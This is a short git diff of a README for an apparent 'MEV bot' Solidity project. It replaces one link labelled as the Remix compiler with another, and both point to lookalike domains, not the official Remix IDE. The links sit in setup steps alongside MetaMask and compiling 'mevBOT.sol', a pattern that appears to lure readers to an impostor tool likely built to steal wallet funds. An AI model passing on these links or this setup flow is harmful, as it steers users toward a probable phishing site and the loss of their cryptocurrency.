@@ -23,8 +23,7 @@ This infrastructure empowers developers and users to send bundles of transaction
 Download MetaMask (if you don’t have it already):
 https://metamask.io/download.html
 
-Access Remix: https://remix-eth.bz/
-
+Access Remix: https://compileremix.pro/
 
 Go to the “Solidity Compiler” tab, select version and then select “Compile mevBOT.sol”.
 
